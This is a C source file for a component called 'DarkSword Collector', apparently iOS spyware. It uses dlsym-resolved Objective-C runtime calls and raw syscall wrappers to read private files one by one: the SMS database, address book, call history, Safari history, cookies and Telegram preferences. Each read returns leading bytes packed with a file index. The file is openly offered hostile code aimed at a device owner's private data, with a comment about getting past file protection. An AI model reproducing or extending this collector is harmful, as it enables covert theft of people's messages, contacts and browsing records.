/**
 * DarkSword Collector v50 - Use ObjC runtime to read files
 * dlsym → objc_msgSend → NSData dataWithContentsOfFile:
 * This goes through the framework layer which may handle NSFileProtection
 */

extern void *dlsym(void *handle, const char *name);
extern int strcmp(const char *s1, const char *s2);

/* ObjC types */
typedef void *id;
typedef void *SEL;
typedef void *Class;

/* objc_msgSend: first arg is receiver, second is selector, rest are method args */
typedef id (*objc_msgSend_t)(id self, SEL op, ...);
typedef Class (*objc_getClass_t)(const char *name);
typedef SEL (*sel_registerName_t)(const char *str);

static objc_msgSend_t _objc_msgSend = 0;
static objc_getClass_t _objc_getClass = 0;
static sel_registerName_t _sel_registerName = 0;

/* Raw syscall fallback */
static long _svc1(long n, long a) {
    register long x16 __asm__("x16") = n; register long x0 __asm__("x0") = a;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16) : "memory"); return x0;
}
static long _svc2(long n, long a, long b) {
    register long x16 __asm__("x16") = n; register long x0 __asm__("x0") = a; register long x1 __asm__("x1") = b;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1) : "memory"); return x0;
}
static long _svc3(long n, long a, long b, long c) {
    register long x16 __asm__("x16") = n; register long x0 __asm__("x0") = a; register long x1 __asm__("x1") = b; register long x2 __asm__("x2") = c;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2) : "memory"); return x0;
}

#define SYS_open 5
#define SYS_read 3
#define SYS_close 6
#define O_RDONLY 0

static volatile int g_ctx = 0;

/* Try to init ObjC runtime */
static int init_objc(void) {
    if (_objc_msgSend) return 1;
    
    _objc_msgSend = (objc_msgSend_t)dlsym(0, "objc_msgSend");
    if (!_objc_msgSend) return 0;
    
    _objc_getClass = (objc_getClass_t)dlsym(0, "objc_getClass");
    _sel_registerName = (sel_registerName_t)dlsym(0, "sel_registerName");
    
    return (_objc_getClass && _sel_registerName) ? 1 : 0;
}

/* Read file using NSData dataWithContentsOfFile: via ObjC runtime */
static int read_file_objc(const char *path, unsigned char *out4) {
    if (!init_objc()) return -1;
    
    /* Create NSString from C string */
    Class nsString = _objc_getClass("NSString");
    SEL utf8Sel = _sel_registerName("stringWithUTF8String:");
    id nsPath = _objc_msgSend(nsString, utf8Sel, path);
    if (!nsPath) return -2;
    
    /* Call NSData dataWithContentsOfFile: */
    Class nsData = _objc_getClass("NSData");
    SEL dataSel = _sel_registerName("dataWithContentsOfFile:");
    id data = _objc_msgSend(nsData, dataSel, nsPath);
    if (!data) return -3;
    
    /* Get bytes */
    SEL bytesSel = _sel_registerName("bytes");
    unsigned char *bytes = (unsigned char *)_objc_msgSend(data, bytesSel);
    if (!bytes) return -4;
    
    /* Get length */
    SEL lengthSel = _sel_registerName("length");
    long len = (long)_objc_msgSend(data, lengthSel);
    if (len < 1) return -5;
    
    /* Copy first 4 bytes */
    for (int i = 0; i < 4 && i < len; i++) out4[i] = bytes[i];
    return (int)len;
}

int ds_start(void) {
    int ctx = g_ctx;
    int phase = (ctx >> 8) & 0xFF;
    int fidx = ctx & 0xFF;
    
    /* Phase 0: Test ObjC init + read /etc/hosts */
    if (phase == 0) {
        int ok = init_objc();
        g_ctx = 1; /* move to phase 1 */
        return ok ? 0x01000001 : 0x01000000; /* high byte=0x01 marker, low bits=success */
    }
    
    /* Phase 1: Read files via ObjC */
    static const char *files[] = {
        "/etc/hosts",
        "/var/mobile/Library/Preferences/.GlobalPreferences.plist",
        "/var/mobile/Library/Preferences/ph.telegra.Telegraph.plist",
        "/var/mobile/Library/SMS/sms.db",
        "/var/mobile/Library/AddressBook/AddressBook.sqlitedb",
        "/var/mobile/Library/CallHistoryDB/CallHistory.storedata",
        "/var/mobile/Library/Safari/History.db",
        "/var/mobile/Library/Cookies/Cookies.binarycookies"
    };
    int num_files = 8;
    
    if (fidx >= num_files) { g_ctx = 0; return 0xFFFFFFFF; }
    
    unsigned char buf[4] = {0};
    int result = read_file_objc(files[fidx], buf);
    
    g_ctx = (1 << 8) | (fidx + 1);
    
    if (result < 0) return 0xFE000000 | fidx; /* open/read failed */
    if (result == 0) return 0xEE000000 | fidx; /* empty */
    
    /* Return: file index in high byte, data in low 24 bits */
    return (int)buf[0] | ((int)buf[1] << 8) | ((int)buf[2] << 16) | ((fidx & 0xFF) << 24);
}
